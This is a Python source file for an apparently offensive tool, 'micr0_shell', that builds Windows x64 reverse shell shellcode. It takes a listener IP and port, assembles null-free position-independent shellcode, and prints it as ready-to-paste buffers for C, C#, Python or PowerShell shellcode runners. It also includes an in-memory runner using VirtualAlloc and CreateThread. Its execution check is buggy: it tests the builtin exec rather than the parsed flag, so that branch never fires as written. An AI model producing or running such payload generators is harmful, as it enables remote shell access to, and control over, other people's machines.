import ctypes
import struct
import argparse
from keystone import Ks, KS_MODE_64, KS_ARCH_X86

from code import CODE


def parse_args():
    parser = argparse.ArgumentParser(description="Dynamically generate Windows x64 reverse shell.")
    parser.add_argument(
        "--ip", "-i", required=True, dest="ip", help="The listening IP address, default value is 192.168.0.45"
    )
    parser.add_argument(
        "--port", "-p", required=False, default=443, dest="port", help="The local listening port, default value is 443"
    )
    parser.add_argument(
        "--language",
        "-l",
        required=False,
        default="python",
        dest="lan",
        help="The language of desired shellcode runner, default language is python. Support c, csharp, python, powershell",
    )
    parser.add_argument(
        "--variable",
        "-v",
        required=False,
        default="buf",
        dest="var",
        help="The variable name of shellcode array, default variable is buf",
    )
    parser.add_argument(
        "--type",
        "-t",
        required=False,
        default="cmd",
        dest="shell_type",
        help="The shell type, Powershell or Cmd, default shell is cmd",
    )
    parser.add_argument(
        "--execution",
        "-e",
        required=False,
        default=False,
        dest="code_exec",
        action="store_true",
        help="Whether to execution generated shellcode? True/False",
    )
    parser.add_argument(
        "--save",
        "-s",
        required=False,
        default=False,
        dest="save",
        action="store_true",
        help="Whether to save the generated shellcode to a bin file, True/False",
    )
    parser.add_argument(
        "--output",
        "-o",
        required=False,
        default="",
        dest="output",
        help="If choose to save the shellcode to file, the desired location.",
    )

    args = parser.parse_args()
    return args


def print_banner():
    banner = """
███╗░░░███╗██╗░█████╗░██████╗░░█████╗░  ░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
████╗░████║██║██╔══██╗██╔══██╗██╔══██╗  ██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██╔████╔██║██║██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║╚██╔╝██║██║██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
██║░╚═╝░██║██║╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝██║░░██║███████╗███████╗███████╗
╚═╝░░░░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
"""
    print(banner)
    print("Author: Senzee")
    print("Github Repository: https://github.com/senzee1984/micr0_shell")
    print("Description: Dynamically generate PIC Null-Free Reverse Shell Shellcode")
    print(
        "Attention: In rare cases (.255 and .0 co-exist), generated shellcode could contain NULL bytes, E.G. when IP is 192.168.0.255\n\n"
    )


def get_port_argument(port):
    port_hex_str = format(port, "04x")
    port_part_1, port_part_2 = port_hex_str[2:], port_hex_str[:2]
    if "00" in {port_part_1, port_part_2}:
        port += 257
        port_hex_str = format(port, "04x")
        port_part_1, port_part_2 = port_hex_str[2:], port_hex_str[:2]
        return f"mov dx, 0x{port_part_1 + port_part_2};\nsub dx, 0x101;"
    return f"mov dx, 0x{port_part_1 + port_part_2};"


def get_ip_argument(ip):
    ip_hex_parts = [format(int(part), "02x") for part in ip.split(".")]
    reversed_hex = "".join(ip_hex_parts[::-1])
    if "00" in ip_hex_parts and "ff" not in ip_hex_parts:
        hex_int = int(reversed_hex, 16)
        neg_hex = (0xFFFFFFFF + 1 - hex_int) & 0xFFFFFFFF
        return f"mov edx, 0x{neg_hex:08x};\nneg rdx;"
    return f"mov edx, 0x{reversed_hex};"


def get_shell_type_argument(shell_type):
    if shell_type.lower() == "cmd":
        return "mov rdx, 0xff9a879ad19b929c;\nnot rdx;"
    return "sub rsp, 8;\nmov rdx, 0xffff9a879ad19393;\nnot rdx;\npush rdx;" "\nmov rdx, 0x6568737265776f70;"


def gen_shellcode(ip, port, shell_type):
    port_argument = get_port_argument(port)
    ip_argument = get_ip_argument(ip)
    shell_type = get_shell_type_argument(shell_type)

    code = CODE.format(port_argument=port_argument, ip_argument=ip_argument, shell_type=shell_type)
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    encoding, count = ks.asm(code)
    sh = b""
    for e in encoding:
        sh += struct.pack("B", e)
    shellcode = bytearray(sh)
    print("[+]Payload size: " + str(len(encoding)) + " bytes\n")
    return shellcode, encoding


def output_shellcode(shellcode, lan, encoding, var, code_exec, save, output):
    lan = lan.lower()
    counter = 0

    if lan == "python":
        print("[+]Shellcode format for Python\n")
        sc = ""
        sc = var + ' = b"'
        for dec in encoding:
            if counter % 20 == 0 and counter != 0:
                sc += '"\n' + var + "+=" + 'b"'
            sc += "\\x{0:02x}".format(int(dec))
            counter += 1

        if counter % 20 > 0:
            sc += '"'
        print(sc)

    elif lan == "c":
        print("[+]Shellcode format for C\n")
        sc = "unsigned char " + var + "[]={\n"
        for dec in encoding:
            if counter % 20 == 0 and counter != 0:
                sc += "\n"
            sc += "0x{0:02x}".format(int(dec)) + ","
            counter += 1
        sc = sc[0 : len(sc) - 1] + "};"
        print(sc)

    elif lan == "powershell":
        print("[+]Shellcode format for Powershell\n")
        sc = "[Byte[]] $" + var + " = "
        for dec in encoding:
            sc += "0x{0:02x}".format(int(dec)) + ","
        sc = sc[0 : len(sc) - 1]
        print(sc)

    elif lan == "csharp":
        print("[+]Shellcode format for C#\n")
        sc = "byte[] " + var + "= new byte[" + str(len(encoding)) + "] {\n"
        for dec in encoding:
            if counter % 20 == 0 and counter != 0:
                sc += "\n"
            sc += "0x{0:02x}".format(int(dec)) + ","
            counter += 1
        sc = sc[0 : len(sc) - 1] + "};"
        print(sc)

    else:
        print("Unsupported language! Exiting...")
        exit()

    if exec is True:
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
        ptr = ctypes.windll.kernel32.VirtualAlloc(
            ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)
        )

        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)))
        print("\n\nShellcode Executed! Shellcode located at address %s" % hex(ptr))
        ht = ctypes.windll.kernel32.CreateThread(
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.c_uint64(ptr),
            ctypes.c_int(0),
            ctypes.c_int(0),
            ctypes.pointer(ctypes.c_int(0)),
        )

        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

    if save is True:
        try:
            with open(output, "wb") as f:
                f.write(shellcode)
                print("\n\nGenerated shellcode successfully saved in file " + output)
        except Exception as e:
            print(e)


def main(args):
    print_banner()
    print("[+]Shellcode Settings:")
    print("******** IP Address: " + args.ip)
    print("******** Listening Port: " + str(args.port))
    print("******** Language of desired shellcode runner: " + args.lan)
    print("******** Shellcode array variable name: " + args.var)
    print("******** Shell: " + args.shell_type)
    print("******** Shellcode Execution: " + str(args.code_exec))
    print("******** Save Shellcode to file: " + str(args.save) + "\n\n")
    shellcode, encoding = gen_shellcode(args.ip, args.port, args.shell_type)
    output_shellcode(shellcode, args.lan, encoding, args.var, args.code_exec, args.save, args.output)


if __name__ == "__main__":
    _args = parse_args()
    main(_args)
